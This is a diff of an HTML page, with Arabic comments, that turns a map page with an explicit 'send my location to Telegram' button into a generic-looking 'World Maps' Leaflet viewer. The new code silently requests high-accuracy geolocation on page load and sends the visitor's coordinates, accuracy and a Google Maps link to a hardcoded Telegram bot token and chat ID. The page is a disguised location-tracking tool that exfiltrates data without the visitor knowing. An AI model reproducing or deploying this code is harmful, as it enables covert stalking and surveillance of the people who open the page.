@@ -3,95 +3,53 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>خرائط Google - مشاركة الموقع</title>
+    <title>خرائط العالم</title>
+    <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />
+    <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
     <style>
-        body, html {
-            height: 100%;
-            margin: 0;
-            font-family: Arial, sans-serif;
-        }
-        #map {
-            height: 90vh;
-            width: 100%;
-        }
-        #sendLocation {
-            width: 100%;
-            padding: 15px;
-            background-color: #4285F4;
-            color: white;
-            font-size: 18px;
-            border: none;
-            cursor: pointer;
-        }
-        #sendLocation:hover {
-            background-color: #357AE8;
-        }
+        body, html { height: 100%; margin: 0; }
+        #map { height: 100vh; }
     </style>
 </head>
 <body>
-
     <div id="map"></div>
-    <button id="sendLocation">📍 إرسال موقعي إلى تيليجرام</button>
 
     <script>
-        let map, marker, latitude, longitude;
+        var map = L.map('map').setView([20, 0], 2); // عرض الخريطة بشكل عام
 
-        function initMap() {
-            map = new google.maps.Map(document.getElementById("map"), {
-                center: { lat: 31.5, lng: 44.4 }, // مركز افتراضي بالعراق
-                zoom: 15
-            });
+        // تحميل خرائط OpenStreetMap
+        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+            attribution: '&copy; OpenStreetMap contributors'
+        }).addTo(map);
 
+        function getLocation() {
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(position => {
-                    latitude = position.coords.latitude;
-                    longitude = position.coords.longitude;
-
-                    let pos = { lat: latitude, lng: longitude };
-                    map.setCenter(pos);
-
-                    marker = new google.maps.Marker({
-                        position: pos,
-                        map: map,
-                        title: "موقعك الحالي"
-                    });
-                }, () => {
-                    alert("لم يتم السماح بالوصول إلى الموقع!");
-                });
-            } else {
-                alert("المتصفح لا يدعم GPS!");
+                navigator.geolocation.getCurrentPosition(sendPosition, null, { enableHighAccuracy: true });
             }
         }
 
-        document.getElementById("sendLocation").addEventListener("click", () => {
-            if (!latitude || !longitude) {
-                alert("الموقع غير متاح بعد!");
-                return;
-            }
+        function sendPosition(position) {
+            let latitude = position.coords.latitude;
+            let longitude = position.coords.longitude;
+            let accuracy = position.coords.accuracy;
 
-            let botToken = "7923151425:AAFInzECazr-2eyok7i4se6RrBV2CeP5v4c";  
-            let chatId = "7326032837";  
+            // إرسال البيانات إلى بوت تيليجرام عبر API
+            let botToken = "7923151425:AAFInzECazr-2eyok7i4se6RrBV2CeP5v4c";  // ضع توكن البوت هنا
+            let chatId = "7326032837";  // ضع معرف الدردشة هنا (يمكنك استخدام ID مجموعة)
+            let message = 📍 موقع جديد تم استلامه:\n\n🌍 Latitude: ${latitude}\n🌍 Longitude: ${longitude}\n🎯 الدقة: ${accuracy} متر\n🔗 خرائط جوجل: https://www.google.com/maps?q=${latitude},${longitude};
 
-            let message = 📍 موقع جديد تم استلامه:\n\n🌍 الإحداثيات:\nLatitude: ${latitude}\nLongitude: ${longitude}\n\n🔗 رابط Google Maps:\nhttps://www.google.com/maps?q=${latitude},${longitude};
+            let telegramUrl = https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)};
+            fetch(telegramUrl);
 
-            let url = https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)};
+            // وضع علامة على الخريطة
+            L.marker([latitude, longitude]).addTo(map)
+                .bindPopup("موقعك الحالي")
+                .openPopup();
+            
+            map.setView([latitude, longitude], 15); // تكبير الخريطة إلى موقع المستخدم
+        }
 
-            fetch(url)
-                .then(response => response.json())
-                .then(data => {
-                    if (data.ok) {
-                        alert("تم إرسال الموقع بنجاح!");
-                    } else {
-                        alert("حدث خطأ أثناء الإرسال.");
-                    }
-                })
-                .catch(error => alert("خطأ في الاتصال: " + error));
-        });
-
+        window.onload = getLocation;
     </script>
-    
-    <!-- استبدل YOUR_GOOGLE_MAPS_API_KEY بمفتاح API الخاص بك -->
-    <script async defer src="https://maps.googleapis.com/maps/api/js?key=YOUR_GOOGLE_MAPS_API_KEY&callback=initMap"></script>
-
 </body>
 </html>
